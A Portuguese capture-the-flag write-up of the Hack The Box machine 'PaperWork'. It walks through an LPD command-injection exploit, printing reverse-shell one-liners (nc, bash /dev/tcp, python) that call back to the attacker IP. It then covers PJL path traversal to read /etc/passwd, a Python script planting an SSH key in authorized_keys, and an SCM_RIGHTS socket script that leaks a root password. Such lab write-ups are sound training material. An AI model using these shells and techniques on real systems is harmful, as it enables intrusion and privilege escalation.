# HTB - PaperWork

Comecei fazendo um portscan simples com Nmap.

```c
~ 〉 nmap -sV -sC -Pn 10.129.84.27
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-10 17:56 -0400
Nmap scan report for 10.129.84.27
Host is up (0.21s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Ubuntu 5ubuntu5.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.28.0 (Ubuntu)
|_http-server-header: nginx/1.28.0 (Ubuntu)
|_http-title: Did not follow redirect to http://paperwork.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Terminando o scan de portas, fui averiguar o website que estava rodando. Baixei o Internal Processor, mas não tinha nada demais. Pelo contexto da página web, imaginei que provavelmente veríamos bastante coisa envolvendo impressoras.

![2026-08-10_18-00.png](HTB%20-%20PaperWork/2026-08-10_18-00.png)

Analisando a página no seu footer, foi possível ver um serviço junto com sua versão.

![2026-08-10_18-09.png](HTB%20-%20PaperWork/2026-08-10_18-09.png)

Dando uma pesquisada sobre ele, já encontramos um vetor de exploração para RCE.

![2026-08-10_18-10.png](HTB%20-%20PaperWork/2026-08-10_18-10.png)

Optei por utilizar esse exploit para automatizar o processo de exploração do RCE junto com a reverse shell.

[https://github.com/Noz2/Digital-Archiving-Solutions-v1.02-RCE](https://github.com/Noz2/Digital-Archiving-Solutions-v1.02-RCE)

```c
 python3 exploit.py  --lhost 10.10.17.17 --lport 6767 paperwork.htb
============================================================
  Paperwork LPD — Precision Shell Injection
============================================================
  Target  : paperwork.htb:1515
  Queue   : archive_intake
  Lhost   : 10.10.17.17:6767
  Inject  : echo 'Archive: '; CMD; #' >> /tmp/archive.log
============================================================

[~] mkfifo
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.17.17 6767 >/tmp/f
[+] Sent — watch your listener!

[~] nc_e
    nc 10.10.17.17 6767 -e /bin/sh
[+] Sent — watch your listener!

[~] nc_c
    nc -c sh 10.10.17.17 6767
[+] Sent — watch your listener!

[~] python3
    python3 -c "import socket,os,pty;s=socket.socket();h='10.10.17.17';s.connect((h,6767));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn('/bin/sh')"
[+] Sent — watch your listener!

[~] python
    python -c "import socket,os,pty;s=socket.socket();h='10.10.17.17';s.connect((h,6767));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn('/bin/sh')"
[+] Sent — watch your listener!

[~] bash
    bash -i >& /dev/tcp/10.10.17.17/6767 0>&1
[+] Sent — watch your listener!

============================================================
  Done.
============================================================
```

```c
~ 〉 nc -lnvp 6767
Listening on 0.0.0.0 6767
Connection received on 10.129.84.27 56744

uname -a
Linux paperwork 6.17.0-40-generic #40-Ubuntu SMP PREEMPT_DYNAMIC Fri Jun 19 16:42:13 UTC 2026 x86_64 GNU/Linux
$
```

Com acesso à máquina, fui analisando algumas coisas e, na parte de análise de portas, achei interessante a quantidade de serviços rodando localmente.

```c
lp@paperwork:/opt/LPDServer$ ss -tlnp
ss -tlnp
State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
LISTEN 0      128        127.0.0.1:1337      0.0.0.0:*
LISTEN 0      100          0.0.0.0:1515      0.0.0.0:*    users:(("python3",pid=987,fd=3))
LISTEN 0      4096      127.0.0.54:53        0.0.0.0:*
LISTEN 0      100        127.0.0.1:9100      0.0.0.0:*
LISTEN 0      4096         0.0.0.0:22        0.0.0.0:*
LISTEN 0      511          0.0.0.0:80        0.0.0.0:*
LISTEN 0      4096   127.0.0.53%lo:53        0.0.0.0:*
LISTEN 0      4096            [::]:22           [::]:*
```

Então subi o Chisel para a máquina e configurei o server dele na minha.

```c
~/chisel 〉 python3 -m http.server 9191
Serving HTTP on 0.0.0.0 port 9191 (http://0.0.0.0:9191/) ...
10.129.84.27 - - [10/Aug/2026 20:09:32] "GET /chisel HTTP/1.1" 200 -
^C
~/cchisel 〉 chisel server -p 7000 --reverse
2026/08/10 20:09:52 server: Reverse tunnelling enabled
2026/08/10 20:09:52 server: Fingerprint VuvQzZ4wIVaps/wkvCszwwT+SG8PTXFBZ84GzcP8ia4=
2026/08/10 20:09:52 server: Listening on http://0.0.0.0:7000
2026/08/10 20:11:12 server: session#1: Client version (1.12.0-rc2) differs from server version (1.11.5)
2026/08/10 20:11:12 server: session#1: tun: proxy#R:9100=>9100: Listening
2026/08/10 20:13:41 server: session#2: Client version (1.12.0-rc2) differs from server version (1.11.5)
2026/08/10 20:13:41 server: session#2: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Depois, configurei o client na máquina alvo.

```c
$ ./chisel client 10.10.17.17:7000 R:socks
./chisel client 10.10.17.17:7000 R:socks
2026/08/11 00:13:38 client: Connecting to ws://10.10.17.17:7000
2026/08/11 00:13:42 client: Connected (Latency 170.585852ms)

```

Com isso, consigo acessar os serviços que estão rodando localmente na máquina alvo através da minha máquina.

```c
~ 〉 nmap 127.0.0.1
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-10 20:14 -0400
Nmap scan report for localhost (127.0.0.1)
Host is up (0.0000020s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE
1080/tcp open  socks
3306/tcp open  mysql
7000/tcp open  afs3-fileserver
8080/tcp open  http-proxy
9100/tcp open  jetdirect

```

Entre todos esses serviços, achei interessante esse JetDirect na porta 9100. Visto que, no início, a página web falava bastante sobre impressoras, dá para imaginar que provavelmente nosso avanço pode estar ligado a ele.

![2026-08-10_20-29.png](HTB%20-%20PaperWork/2026-08-10_20-29.png)

Me conectei nele via Netcat. Aqui vamos utilizar PJL (Printer Job Language), que basicamente é uma linguagem utilizada para comunicação e controle de dispositivos de impressão.

```c
~ 〉 nc 127.0.0.1 9100
@PJL INFO ID
HP LASERJET 4ML
@PJL FSDIRLIST NAME="0:/" ENTRY=1 COUNT=1024
. TYPE=DIR
.. TYPE=DIR
logs TYPE=DIR SIZE=4096
jetdirect.py TYPE=FILE SIZE=5119

```

A partir daqui, comecei a investigar quais operações de filesystem poderiam ser realizadas através dessa interface.

Se você pesquisar um pouco sobre falhas nesse modelo de JetDirect, vai descobrir que existe uma falha de path traversal que pode ser escalada para RCE. Replicando a PoC, tivemos nosso primeiro resultado. O interessante aqui é que conseguimos sair do diretório esperado pelo serviço e acessar arquivos diretamente no filesystem do sistema operacional. Com isso, conseguimos confirmar que existe uma leitura arbitrária de arquivos através do PJL.

```c
@PJL FSUPLOAD NAME="../../../../../../../../../../../../../../../../../etc/passwd" SIZE=1672
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
messagebus:x:997:997:System Message Bus:/nonexistent:/usr/sbin/nologin
systemd-resolve:x:991:991:systemd Resolver:/:/usr/sbin/nologin
_chrony:x:101:103:Chrony daemon:/var/lib/chrony:/usr/sbin/nologin
usbmux:x:102:46:usbmux daemon:/var/lib/usbmux:/usr/sbin/nologin
polkitd:x:990:990:User for polkitd:/:/usr/sbin/nologin
syslog:x:104:104::/nonexistent:/usr/sbin/nologin
uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
tss:x:107:108:TPM software stack:/var/lib/tpm:/bin/false
fwupd-refresh:x:988:988:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
sshd:x:987:65534:sshd user:/run/sshd:/usr/sbin/nologin
archivist:x:1000:1000:archivist:/home/archivist:/bin/bash
_laurel:x:999:987::/var/log/laurel:/bin/false

```

O segundo teste a ser feito é ver se conseguimos acessar o diretório do usuário archivist através dessa impressora, já que o objetivo aqui é fazer a movimentação lateral. Conseguindo acessar o diretório do archivist, podemos confirmar que temos acesso a arquivos do usuário e também encontramos um diretório .ssh.

```c
 printf '@PJL FSQUERY NAME="0:/../../archivist"\r\n' | nc -v 127.0.0.1 9100
Connection to 127.0.0.1 9100 port [tcp/*] succeeded!
. TYPE=DIR
.. TYPE=DIR
.cache TYPE=DIR SIZE=4096
.bashrc TYPE=FILE SIZE=3771
.local TYPE=DIR SIZE=4096
.ssh TYPE=DIR SIZE=4096
.profile TYPE=FILE SIZE=807
.lesshst TYPE=FILE SIZE=20
.bash_history TYPE=FILE SIZE=0
user.txt TYPE=FILE SIZE=33
.bash_logout TYPE=FILE SIZE=220
.gnupg TYPE=DIR SIZE=4096
printer TYPE=DIR SIZE=4096
```

Confirmando o acesso ao archivist, podemos já pegar uma flag e também confirmar outro detalhe: o archivist possui um diretório .ssh.

```c
@PJL FSUPLOAD NAME="0:/../../archivist/user.txt" SIZE=33
<FLAG>
```

Bom, lembra que falei que essa falha é mais do que apenas um path traversal? Aqui entra a chain para conseguir acesso ao usuário. Primeiro, gerei um par de chaves SSH que vou enviar para o authorized_keys do archivist.

```c
ssh-keygen -t ed25519 -f archivist_key
```

Para facilitar, fiz uma pequena automação usando como base o exploit de uma PoC da Tenable: [https://www.tenable.com/blog/rooting-a-printer-from-security-bulletin-to-remote-code-execution](https://www.tenable.com/blog/rooting-a-printer-from-security-bulletin-to-remote-code-execution) 

Em resumo, ele faz o upload direto da chave pública gerada para o authorized_keys do archivist, permitindo acessar o usuário através do SSH.

```c
import socket
import sys

if len(sys.argv) != 3:
    print(f"Usage: {sys.argv[0]} <ip> <port>")
    sys.exit(1)

host = sys.argv[1]
port = int(sys.argv[2])

with open("archivist_key.pub", "rb") as f:
    pubkey = f.read()

name = r'0:\..\..\..\home\archivist\.ssh\authorized_keys'

header = (
    f'@PJL FSDOWNLOAD NAME="{name}" SIZE={len(pubkey)}\r\n'
).encode()

payload = header + pubkey

print(f"[+] Connecting to {host}:{port}")
print(f"[+] Public key size: {len(pubkey)} bytes")
print(f"[+] Target: {name}")

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.settimeout(5)
    s.connect((host, port))

    print("[+] Sending FSDOWNLOAD...")
    s.sendall(payload)

    try:
        response = s.recv(4096)
        print(f"[+] Response: {response!r}")

        if response == b"OK\r\n":
            print("[+] FSDOWNLOAD accepted")
        else:
            print("[-] FSDOWNLOAD did not return OK")

    except socket.timeout:
        print("[-] Timeout waiting for PJL response")
```

Depois de executar o script, recebemos a confirmação de que o FSDOWNLOAD foi aceito.

Agora temos acesso ao usuário archivist. Com isso, podemos começar a enumerar a máquina novamente e procurar nosso vetor de LPE.

```c
~ 〉 python3 exp.py 127.0.0.1 9100
[+] Connecting to 127.0.0.1:9100
[+] Public key size: 105 bytes
[+] Target: 0:\..\..\..\home\archivist\.ssh\authorized_keys
[+] Sending FSDOWNLOAD...
[+] Response: b'OK\r\n'
[+] FSDOWNLOAD accepted
~ 〉 ssh -i archivist_key archivist@paperwork.htb
Last login: Thu May 28 15:22:41 UTC 2026 from 10.10.14.3 on ssh
Welcome to Ubuntu 25.10 (GNU/Linux 6.17.0-40-generic x86_64)

 * Documentation:  https://docs.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro
Last login: Tue Aug 11 22:31:34 2026 from 10.10.17.17
archivist@paperwork:~$
```

Depois de procurar por um tempo e me prender em um rabbit hole com o Bash, finalmente achei um vetor interessante.

 Aqui temos um socket rodando e, com o usuário archivist, temos autoridade sobre ele. Vamos explorar uma possível boundary violation aqui. Basicamente, isso acontece quando temos permissão para interagir ou modificar algum recurso que também é utilizado por um serviço ou processo com privilégios maiores, nesse caso, um processo relacionado ao root.

Primeiro, encontrei o socket em /run/paperwork:

```c
archivist@paperwork:/tmp$ cd /run/paperwork
archivist@paperwork:/run/paperwork$ ls
mgmt.sock
```

O ponto interessante foi analisar as respostas que o socket retorna. Quando executamos determinados comandos através do PJL e tentamos interagir com o socket, a resposta muda para um aviso de security violation. Isso indica que existe algum tipo de mecanismo de validação ou monitoramento acontecendo por trás do socket.

```c
archivist@paperwork:/tmp$ cat /run/paperwork/mgmt.sock
STATUS: SYSTEM_CLEAN
SIGNATURE: d92938059e3e5371cf54db65d60963aecacedf69e493c44a8b618036b07cbdbe

archivist@paperwork:/tmp$ cat /run/paperwork/mgmt.sock
ALERT: SECURITY_VIOLATION
```

Novamente, vamos automatizar isso para facilitar nosso workflow.

Novamente, vamos automatizar isso para facilitar nosso workflow.

Em resumo, o script se conecta ao socket /run/paperwork/mgmt.sock, recebe file descriptors enviados pelo processo servidor, lê o conteúdo desses arquivos e procura por uma linha contendo ADMIN_PASSWORD= 

Aqui a parte interessante é o uso de SCM_RIGHTS. Através de um Unix Domain Socket, um processo pode enviar file descriptors para outro processo. Dessa forma, nosso script não precisa conhecer diretamente o caminho do arquivo que está sendo acessado. Ele recebe o descriptor já aberto pelo processo que está do outro lado do socket e pode tentar ler seu conteúdo.

```c
import socket
import array
import os

SOCKET_PATH = "/run/paperwork/mgmt.sock"
BUFFER_SIZE = 4096
MAX_FDS = 2

with socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as sock:
    sock.connect(SOCKET_PATH)

    _, ancdata, _, _ = sock.recvmsg(
        BUFFER_SIZE,
        socket.CMSG_LEN(MAX_FDS * array.array("i").itemsize)
    )

    fds = array.array("i")

    for level, msg_type, data in ancdata:
        if level == socket.SOL_SOCKET and msg_type == socket.SCM_RIGHTS:
            usable = len(data) - (len(data) % fds.itemsize)
            fds.frombytes(data[:usable])

    for fd in fds:
        try:
            content = os.pread(fd, BUFFER_SIZE, 0)

            for line in content.splitlines():
                if line.startswith(b"ADMIN_PASSWORD="):
                    print(line.decode(errors="replace"))
                    break

        finally:
            os.close(fd)
```

Gotcha.

```c
archivist@paperwork:/tmp$ python3 expp.py
ADMIN_PASSWORD=ApparelMortuaryCedar22
```

Agora podemos logar como root e catar a flag de system

```c
~ 〉 ssh root@paperwork.htb
root@paperwork.htb's password:
Last login: Tue Jul  7 13:54:13 UTC 2026 from 10.10.14.84 on ssh
Welcome to Ubuntu 25.10 (GNU/Linux 6.17.0-40-generic x86_64)

 * Documentation:  https://docs.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro
Failed to connect to https://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings

Last login: Tue Aug 11 23:02:28 2026 from 10.10.17.17
root@paperwork:~# cd /root

```

GG.

```c
root@paperwork:~# cat root.txt
<FLAG>
```

![2026-08-11_19-03.png](HTB%20-%20PaperWork/2026-08-11_19-03.png)
